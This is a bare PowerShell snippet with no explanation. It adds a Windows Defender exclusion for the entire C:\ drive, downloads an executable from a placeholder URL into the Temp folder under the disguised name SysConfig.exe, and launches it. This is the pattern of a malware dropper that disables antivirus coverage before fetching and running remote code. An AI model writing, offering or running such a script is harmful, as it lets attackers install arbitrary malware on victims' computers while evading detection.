Add-MpPreference -ExclusionPath C:\
$url = "google.com"
$out = "$env:Temp\SysConfig.exe"
Invoke-WebRequest -Uri $url -OutFile $out 
Start-Process -FilePath $out
